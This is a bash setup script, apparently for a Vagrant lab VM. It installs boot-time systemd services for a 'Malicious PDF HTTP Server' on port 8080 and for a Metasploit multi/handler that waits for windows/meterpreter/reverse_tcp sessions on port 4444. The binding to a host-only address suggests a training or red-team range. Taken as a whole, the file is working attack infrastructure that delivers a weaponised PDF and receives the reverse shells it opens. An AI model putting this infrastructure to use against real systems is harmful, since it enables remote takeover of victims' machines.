#!/bin/bash
# Setup automatic HTTP server and Metasploit listener on boot

echo "Setting up automatic services on boot..."

# Ensure .msf4/local directory exists
mkdir -p /home/vagrant/.msf4/local

# Create systemd service file
sudo tee /etc/systemd/system/pdf-server.service > /dev/null << 'EOF'
[Unit]
Description=Malicious PDF HTTP Server
After=network.target

[Service]
Type=simple
User=vagrant
WorkingDirectory=/home/vagrant/.msf4/local
# Bind only to host-only interface (192.168.56.101) not all interfaces
ExecStart=/usr/bin/python3 -m http.server 8080 --bind 192.168.56.101
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Enable the service (will start on boot)
sudo systemctl daemon-reload
sudo systemctl enable pdf-server.service

# Try to start now if PDF exists
if [ -f "/home/vagrant/.msf4/local/JOAN-ESPINACH-TRD.pdf" ]; then
    sudo systemctl start pdf-server.service

    # Wait a moment and check status
    sleep 2
    if sudo systemctl is-active --quiet pdf-server.service; then
        echo "✓ HTTP server started successfully on port 8080"
        echo "  PDF URL: http://192.168.56.101:8080/JOAN-ESPINACH-TRD.pdf"
    else
        echo "⚠ HTTP server failed to start, but will start on next boot"
    fi
else
    echo "⚠ PDF not found yet, HTTP server will start on next boot"
    echo "  Service enabled and will start automatically"
fi

echo ""
echo "Setting up automatic Metasploit listener..."

# Create directory for Metasploit configuration
sudo mkdir -p /etc/metasploit

# Create Metasploit resource script for the listener
sudo tee /etc/metasploit/listener.rc > /dev/null << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
set ExitOnSession false
set SessionCommunicationTimeout 300
set EnableStageEncoding true
exploit -j -z
EOF

# Create systemd service for Metasploit listener
sudo tee /etc/systemd/system/metasploit-listener.service > /dev/null << 'EOF'
[Unit]
Description=Metasploit Listener for PDF Exploit
After=network.target

[Service]
Type=simple
User=vagrant
Environment="HOME=/home/vagrant"
# Bind explicitly to host-only interface (192.168.56.101:4444)
ExecStart=/usr/bin/msfconsole -q -r /etc/metasploit/listener.rc
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

# Enable the Metasploit listener service
sudo systemctl daemon-reload
sudo systemctl enable metasploit-listener.service

# Start the listener now
sudo systemctl start metasploit-listener.service

# Wait a moment for listener to initialize
echo "  Waiting for Metasploit listener to start..."
sleep 10

# Check if listener is running
if sudo systemctl is-active --quiet metasploit-listener.service; then
    echo "✓ Metasploit listener started successfully"
    echo "  Listening on: 192.168.56.101:4444"
    echo "  Check status: sudo systemctl status metasploit-listener"
    echo "  View logs: sudo journalctl -u metasploit-listener -f"

    # Verify port is actually listening
    sleep 5
    if sudo ss -tuln | grep -q ":4444 "; then
        echo "✓ Port 4444 is listening and ready for connections"
    else
        echo "⚠ WARNING: Port 4444 not detected yet, may still be initializing"
    fi
else
    echo "⚠ WARNING: Metasploit listener failed to start"
    echo "  Check logs: sudo journalctl -u metasploit-listener -xe"
fi

echo ""
echo "═══════════════════════════════════════════════════════════"
echo "  Autostart Configuration Complete"
echo "═══════════════════════════════════════════════════════════"
echo ""
echo "Services configured:"
echo "  • HTTP Server:         192.168.56.101:8080"
echo "  • Metasploit Listener: 192.168.56.101:4444"
echo ""
echo "Both services will start automatically on boot."
